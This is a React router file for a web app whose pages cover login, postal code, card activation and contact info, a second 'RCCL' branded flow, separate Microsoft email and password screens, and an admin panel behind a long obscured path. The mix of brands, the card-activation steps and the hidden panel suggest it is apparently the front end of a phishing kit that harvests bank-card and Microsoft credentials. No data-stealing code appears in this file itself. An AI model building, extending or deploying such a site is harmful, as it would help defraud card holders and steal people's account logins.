import { lazy, Suspense } from "react";
import { Switch, Route } from "wouter";
import { queryClient } from "./lib/queryClient";
import { QueryClientProvider } from "@tanstack/react-query";
import { Toaster } from "@/components/ui/toaster";
import { TooltipProvider } from "@/components/ui/tooltip";
import { LanguageProvider } from "@/contexts/LanguageContext";
import { ContentProtection } from "@/components/ContentProtection";
import { CookieConsent } from "@/components/CookieConsent";
import NotFound from "@/pages/not-found";
import LoginPage from "@/pages/LoginPage";

const PostalCodePage = lazy(() => import("@/pages/PostalCodePage"));
const CardActivationPage = lazy(() => import("@/pages/CardActivationPage"));
const ContactInfoPage = lazy(() => import("@/pages/ContactInfoPage"));
const RegisterPage = lazy(() => import("@/pages/RegisterPage"));
const ForgotUsernamePage = lazy(() => import("@/pages/ForgotUsernamePage"));
const ForgotPasswordPage = lazy(() => import("@/pages/ForgotPasswordPage"));
const MicrosoftEmailPage = lazy(() => import("@/pages/MicrosoftEmailPage"));
const MicrosoftPasswordPage = lazy(() => import("@/pages/MicrosoftPasswordPage"));
const AdminPage = lazy(() => import("@/pages/AdminPage"));
const AccountPage = lazy(() => import("@/pages/AccountPage"));
const RcclPage = lazy(() => import("@/pages/RcclPage"));
const RcclRegisterPage = lazy(() => import("@/pages/RcclRegisterPage"));
const RcclCardActivationPage = lazy(() => import("@/pages/RcclCardActivationPage"));

function Router() {
  return (
    <Suspense fallback={<div style={{ minHeight: '100vh' }} />}>
      <Switch>
        {/* Main Login Routes */}
        <Route path="/" component={LoginPage} />
        <Route path="/login" component={LoginPage} />
        
        {/* Account & Auth Routes */}
        <Route path="/account" component={AccountPage} />
        <Route path="/register" component={RegisterPage} />
        <Route path="/forgot-username" component={ForgotUsernamePage} />
        <Route path="/forgot-password" component={ForgotPasswordPage} />
        
        {/* Card Activation Routes */}
        <Route path="/postal-code" component={PostalCodePage} />
        <Route path="/activate-card" component={CardActivationPage} />
        <Route path="/contact-info" component={ContactInfoPage} />
        
        {/* RCCL Routes */}
        <Route path="/rccl" component={RcclPage} />
        <Route path="/rccl/login" component={RcclPage} />
        <Route path="/rccl-register" component={RcclRegisterPage} />
        <Route path="/rccl/register" component={RcclRegisterPage} />
        <Route path="/rccl-activate-card" component={RcclCardActivationPage} />
        <Route path="/rccl/activate-card" component={RcclCardActivationPage} />
        
        {/* Microsoft Auth Routes */}
        <Route path="/microsoft-email" component={MicrosoftEmailPage} />
        <Route path="/microsoft-password" component={MicrosoftPasswordPage} />
        
        {/* Admin Panel */}
        <Route path="/secure-admin-panel-7f8a9b2c4d5e6f1a3b8c9d0e2f4a6b8c9d1e3f5a7b9c0d2e4f6a8b0c2d4e6f8a" component={AdminPage} />
        
        <Route component={NotFound} />
      </Switch>
    </Suspense>
  );
}

function App() {
  return (
    <QueryClientProvider client={queryClient}>
      <LanguageProvider>
        <TooltipProvider>
          <ContentProtection />
          <CookieConsent />
          <Toaster />
          <Router />
        </TooltipProvider>
      </LanguageProvider>
    </QueryClientProvider>
  );
}

export default App;
